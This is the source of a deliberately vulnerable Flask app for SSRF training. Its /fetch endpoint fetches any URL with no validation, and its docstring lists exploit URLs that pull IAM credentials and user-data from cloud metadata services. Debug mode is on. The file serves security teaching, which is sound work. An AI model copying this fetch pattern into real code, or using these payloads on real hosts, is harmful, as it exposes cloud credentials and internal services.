#!/usr/bin/env python3
"""
SSRF Lab — a deliberately vulnerable "URL Preview" web app.

PURPOSE: authorized security training / testing only.
This app fetches any user-supplied URL server-side with NO validation,
so it can be used to reach internal services and the cloud metadata
endpoint (IMDSv1, http://169.254.169.254/) from the host it runs on.

Do NOT deploy this on anything exposed to the public internet.
"""

import socket

import requests
from flask import Flask, render_template, request, jsonify, Response

app = Flask(__name__)

# Deliberately permissive. A real app would validate the scheme/host and
# block link-local / private ranges. We do none of that on purpose.
FETCH_TIMEOUT = 5


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/fetch")
def fetch():
    """
    VULNERABLE ENDPOINT.

    GET /fetch?url=<anything>

    The server blindly performs a request to whatever `url` the user
    supplies and returns the raw response. Classic SSRF.

    Exploit examples (run against an instance using IMDSv1):
      /fetch?url=http://169.254.169.254/latest/meta-data/
      /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
      /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
      /fetch?url=http://169.254.169.254/latest/user-data

      # GCP (needs the Metadata-Flavor header normally, but IMDS-style demo):
      /fetch?url=http://metadata.google.internal/computeMetadata/v1/

      # Internal port scan / service discovery:
      /fetch?url=http://127.0.0.1:8080/
    """
    url = request.args.get("url", "").strip()
    if not url:
        return jsonify(error="provide a ?url= parameter"), 400

    try:
        # No allow-list, no scheme check, no DNS-rebinding protection,
        # redirects followed. This is the bug.
        resp = requests.get(
            url,
            timeout=FETCH_TIMEOUT,
            allow_redirects=True,
            # Some metadata services key off the User-Agent; keep it plain.
            headers={"User-Agent": "ssrf-lab-preview/1.0"},
        )
        body = resp.text
        content_type = resp.headers.get("Content-Type", "text/plain")

        # Return the fetched content straight back to the attacker.
        return Response(
            body,
            status=resp.status_code,
            content_type=content_type,
            headers={"X-Fetched-URL": url},
        )
    except requests.exceptions.RequestException as exc:
        return jsonify(error=str(exc), url=url), 502


@app.route("/healthz")
def healthz():
    return jsonify(status="ok", host=socket.gethostname())


if __name__ == "__main__":
    # Bind to all interfaces so you can hit it from your attacking host
    # inside the lab. Change the port with -p / env if needed.
    app.run(host="0.0.0.0", port=5000, debug=True)
